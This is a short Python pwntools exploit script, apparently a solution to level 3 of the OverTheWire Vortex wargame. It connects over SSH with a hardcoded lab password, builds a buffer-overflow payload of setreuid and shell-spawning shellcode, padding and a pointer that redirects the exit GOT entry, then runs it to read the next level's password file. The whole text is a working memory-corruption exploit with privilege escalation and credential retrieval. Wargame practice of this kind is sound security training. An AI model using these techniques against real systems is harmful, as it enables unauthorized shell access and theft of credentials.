from pwn import *

context.arch = 'i386'
context.os = 'linux'

s = ssh(host='vortex.labs.overthewire.org', user='vortex3', password='64ncXTvx#')
s.download_file('/vortex/vortex3')

exe = ELF('vortex3')
# jmp in plt contains got address when you omit 2 bytes
addr = exe.plt['exit'] + 2

log.info('Pointer to exit@got: {}'.format(hex(addr)))

buflen = 128
shellcode = asm(shellcraft.setreuid() + shellcraft.sh())

# override only lpp to point at sth that points at got, so that
# **lpp == exit@got
# this way it is possible to overwrite got entry with address of our buffer
# this works because &buf == buf in this case
exploit = shellcode + cyclic(buflen - len(shellcode) + 4) + p32(addr)

p = s.run("/vortex/vortex3 '{}'".format(exploit))
p.send('cat /etc/vortex_pass/vortex4\n')
log.success('Password: {}'.format(p.recv()))
